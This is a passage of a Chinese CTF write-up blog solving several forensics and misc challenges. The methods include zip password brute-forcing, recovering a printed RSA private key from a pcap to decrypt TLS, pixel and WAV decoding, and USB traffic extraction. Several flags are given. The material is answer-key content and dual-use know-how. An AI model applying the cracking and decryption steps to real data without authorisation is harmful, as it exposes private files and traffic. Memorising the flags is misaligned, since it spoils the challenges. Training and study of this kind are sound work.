flag.zip flag<br></code></pre></td></tr></table></figure><p>知道密码为python当时的时间戳，由于是2019年的题，所以搜了一下，当时的时间戳应该是15开头。</p><p>而flag.zip又有密码，因此掩码爆破得到flag</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-09%20161711.png" alt="屏幕截图 2023-11-09 161711"></p><h3 id="DDCTF2018-流量分析"><a href="#DDCTF2018-流量分析" class="headerlink" title="[DDCTF2018]流量分析"></a>[DDCTF2018]流量分析</h3><p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式</p><p>打开流量包后发现有tls流量。</p><p>那就wireshark打开，筛选tcp contains “KEY”</p><p>发现有许多的base串</p><p>解码后发现是一张PNG格式的图片</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-16%20225635-17001467003925.png" alt="屏幕截图 2023-11-16 225635"></p><p><img src="/../images/1-17001465724792.png" alt="1"></p><p>将其复制下来，在进行对照，并补全密钥。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ<br>LsJIhbRYS7+zZ1oXvPemWQDv<span class="hljs-regexp">/u/</span>tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO<br>vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB<br>AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4<br>QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/<br>QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN<br>czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ<br>ZCM4prBjAkEAz+ENahsEjBE4+<span class="hljs-number">7</span>H1HdIaw0+goe<span class="hljs-regexp">/45d6A2ewO/</span>lYH6dDZTAzTW9z9<br>kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN<br>+<span class="hljs-number">04</span>eTWQCmH3haeQ<span class="hljs-regexp">/0Cd9XyHBUveJ42Be8/</span>jeDcIx7dGLxZKajHbEAfBFnAsCQGq1<br>AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH<br><span class="hljs-regexp">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/</span>kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH<br><span class="hljs-number">2</span>STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=<br>-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----<br><br><br></code></pre></td></tr></table></figure><p>在导入tsl密钥，过滤http，即可得到flag</p><h3 id="b01lers2020-image-adjustments"><a href="#b01lers2020-image-adjustments" class="headerlink" title="[b01lers2020]image_adjustments"></a>[b01lers2020]image_adjustments</h3><p><img src="/../images/attachment.png" alt="attachment"></p><p>就是把所有红线全放到上面或者下面，然后使得黑线跟着移动，最终得到flag。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_turn</span>(<span class="hljs-params">pixels,num</span>):<br>    <span class="hljs-keyword">return</span> pixels[num:]+pixels[:num]<br>p = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attachment.png&#x27;</span>).convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)<br>a,b = p.size<br>pixels=[]<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a):<br>    pixel = []<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>        pixel.append(p.getpixel((x,y)))<br>    pixels.append(pixel)<br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pixels:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)):<br>        <span class="hljs-keyword">if</span> i[j] != i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> i [j-<span class="hljs-number">1</span>] == (<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>):<br>            data.append(j)<br>            <span class="hljs-keyword">break</span><br>_pixels = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    _pixels.append(re_turn(pixels[i],data[i]))<br>p1 = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(a,b))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a) :<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>        p1.putpixel((x,y),_pixels[x][y])<br>p1.save(<span class="hljs-string">&#x27;flag1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/flag1.png" alt="flag1"></p><h3 id="洞拐洞拐洞洞拐"><a href="#洞拐洞拐洞洞拐" class="headerlink" title="洞拐洞拐洞洞拐"></a>洞拐洞拐洞洞拐</h3><p><img src="/../images/2.png" alt="2"></p><p>该图有许多黑白像素</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">320</span><br>p =Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.png&#x27;</span>).convert(<span class="hljs-string">&#x27;L&#x27;</span>)<br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(MAX):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(MAX):<br>        <span class="hljs-keyword">if</span> p.getpixel((x,y))==<span class="hljs-number">255</span>:<br>            flag += <span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">if</span> p.getpixel((x,y))== <span class="hljs-number">0</span> :<br>            flag += <span class="hljs-string">&#x27;1&#x27;</span><br><br>fp.write(flag)<br></code></pre></td></tr></table></figure><p>在转二进制后，发现是一个wav文件，保存下来，打开</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-12%20143329.png" alt="屏幕截图 2024-03-12 143329"></p><p>发现每秒有十帧，共有八种不同的高度</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> wave<br><span class="hljs-keyword">import</span> base64<br>f = wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.wav&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>params=f.getparams()<br>nchannels, sampwidth, framerate, nframes = params[:<span class="hljs-number">4</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>rflag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">319</span>):<br>strData=f.readframes(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0\x01\xa0&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0\x01\xc0&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0\x01\xe0&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f\xff\x1f&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;4&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?\xff?&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_\xff_&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-keyword">if</span> strData == <span class="hljs-string">b&#x27;\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f\xff\x7f&#x27;</span>:<br>flag += <span class="hljs-string">&#x27;7&#x27;</span><br>flag += <span class="hljs-string">&#x27;5&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">3</span>):<br>b = flag[i]+flag[i+<span class="hljs-number">1</span>]+flag[i+<span class="hljs-number">2</span>]<br>c = <span class="hljs-built_in">int</span>(b,<span class="hljs-number">8</span>)<br>rflag += <span class="hljs-built_in">chr</span>(c)<br>rflag += <span class="hljs-string">&#x27;======&#x27;</span><br>flag = base64.b32decode(rflag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="SUCTF2019-protocol"><a href="#SUCTF2019-protocol" class="headerlink" title="[SUCTF2019]protocol"></a>[SUCTF2019]protocol</h3><p>USB流量导出</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tshark</span> -r <span class="hljs-number">1</span>.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>什么都没有发现，然后检查流量包发现png</p><p>foremost分离得到</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20220238.png" alt="屏幕截图 2024-03-20 220238"></p><p>发现十五个字母图片后面有是个黑色图片，继续看流量包</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20220255.png" alt="屏幕截图 2024-03-20 220255"></p><p>发现数据第三个比特有规律变化，前十五个为图片顺序后面使黑色的顺序，对应得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><span class="hljs-attribute">06</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>e <span class="hljs-number">04</span> <span class="hljs-number">01</span> <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">0</span>b <span class="hljs-number">09</span><br><br><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><span class="hljs-attribute">01</span> <span class="hljs-number">0</span>e <span class="hljs-number">08</span> <span class="hljs-number">06</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>b<br><br><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><span class="hljs-attribute">02</span> <span class="hljs-number">09</span> <span class="hljs-number">03</span> <span class="hljs-number">05</span> <span class="hljs-number">01</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>b <span class="hljs-number">0</span>e <span class="hljs-number">04</span><br><br><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><span class="hljs-attribute">06</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>a <span class="hljs-number">08</span> <span class="hljs-number">09</span> <span class="hljs-number">04</span> <span class="hljs-number">0</span>b <span class="hljs-number">03</span> <span class="hljs-number">0</span>c <span class="hljs-number">02</span><br><br><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><br><span class="hljs-comment"># 将重复多余的删除就是得到</span><br><span class="hljs-attribute">04</span> <span class="hljs-number">03</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">09</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span> <span class="hljs-number">0</span>e <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">0</span>a<br><span class="hljs-attribute">06</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>e <span class="hljs-number">04</span> <span class="hljs-number">01</span> <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">0</span>b <span class="hljs-number">09</span><br><span class="hljs-attribute">01</span> <span class="hljs-number">0</span>e <span class="hljs-number">08</span> <span class="hljs-number">06</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>b<br><span class="hljs-attribute">02</span> <span class="hljs-number">09</span> <span class="hljs-number">03</span> <span class="hljs-number">05</span> <span class="hljs-number">01</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>b <span class="hljs-number">0</span>e <span class="hljs-number">04</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>a <span class="hljs-number">08</span> <span class="hljs-number">09</span> <span class="hljs-number">04</span> <span class="hljs-number">0</span>b <span class="hljs-number">03</span> <span class="hljs-number">0</span>c <span class="hljs-number">02</span><br><br><br><br><br><span class="hljs-attribute">suctf</span>&#123;My_usb_pr0toco1_s0_w3ak&#125;<br><br></code></pre></td></tr></table></figure><h3 id="MRCTF2020-千层套路"><a href="#MRCTF2020-千层套路" class="headerlink" title="[MRCTF2020]千层套路"></a>[MRCTF2020]千层套路</h3><p>题目是一个压缩包套娃，密码是该文件的名字</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br>name = <span class="hljs-string">&#x27;0573&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = zipfile.ZipFile(name+<span class="hljs-string">&#x27;.zip&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    r.extractall(path=<span class="hljs-string">&#x27;.&#x27;</span>,pwd=<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    r.close()<br>    os.remove(name+<span class="hljs-string">&#x27;.zip&#x27;</span>)<br>    name =  r.namelist()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br><br></code></pre></td></tr></table></figure><p>得到qr.zip，打开后发现应该是一个图片</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br>(<span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span><span class="hljs-punctuation">,</span> <span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><p>python得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span>*<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qr.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><br>i=<span class="hljs-number">0</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">200</span>,<span class="hljs-number">200</span>))<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>            color=file.readline()<br>            pic.putpixel([x,y],<span class="hljs-built_in">eval</span>(color)) <span class="hljs-comment">#eval函数可以直接得到元组</span><br>        <br>pic.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>发现是一个二维码，解码得到flag</p><h3 id="一路到底"><a href="#一路到底" class="headerlink" title="一路到底"></a>一路到底</h3><p>题目给了许多txt文件。</p><p>最下面有一个start.txt，打开发现</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">20555 </span>: The <span class="hljs-keyword">next</span> is a8242a234560a0d3cf121864ee34d7fb.txt<br></code></pre></td></tr></table></figure><p>前面数字hex转化后未504B，下一个则是0304，猜测是一个压缩包。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;start.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    text = f.read()<br>    nexxt = text[-<span class="hljs-number">36</span>:]<br>    data=<span class="hljs-string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(text[<span class="hljs-number">0</span>:text.find(<span class="hljs-string">&#x27;:&#x27;</span>)-<span class="hljs-number">1</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data))<br>    flag += data<br>    <span class="hljs-built_in">print</span>(text, <span class="hljs-string">&#x27;\t&#x27;</span>, nexxt, <span class="hljs-string">&#x27;\t&#x27;</span>, data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">160000</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(nexxt) <span class="hljs-keyword">as</span> f:<br>                text = f.read()<br>                nexxt = text[-<span class="hljs-number">36</span>:] <br>                data = <span class="hljs-string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(text[<span class="hljs-number">0</span>:text.find(<span class="hljs-string">&#x27;:&#x27;</span>)-<span class="hljs-number">1</span>]))<br>                flag += data<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;123.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> dw:<br>    dw.write(binascii.unhexlify(flag))<br></code></pre></td></tr></table></figure><p>然后破解密码。</p><p>得到一个png，其实是jpg格式，修改得到图片。</p><p><img src="/../images/image.jpg" alt="image"></p><h3 id="key不在这里"><a href="#key不在这里" class="headerlink" title="key不在这里"></a>key不在这里</h3><p>给了一个二维码，解码得到</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">https://cn.bing.com/search?q=<span class="hljs-keyword">key</span><span class="hljs-title function_">%E4</span><span class="hljs-title function_">%B8</span>%8D<span class="hljs-title function_">%E5</span>%9C<span class="hljs-title function_">%A8</span><span class="hljs-title function_">%E8</span><span class="hljs-title function_">%BF</span>%99<span class="hljs-title function_">%E9</span>%87%8C<span class="hljs-variable">&amp;m</span>=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568<span class="hljs-variable">&amp;qs</span>=n<span class="hljs-variable">&amp;form</span>=QBRE<span class="hljs-variable">&amp;sp</span>=-1<span class="hljs-variable">&amp;sc</span>=0-38<span class="hljs-variable">&amp;sk</span>=<span class="hljs-variable">&amp;cvid</span>=2CE15329C18147CBA4C1CA97C8E1BB8C<br></code></pre></td></tr></table></figure><p>发现中间有一串数字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568<br></code></pre></td></tr></table></figure><p>猜测是ascii码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse<br>s = <span 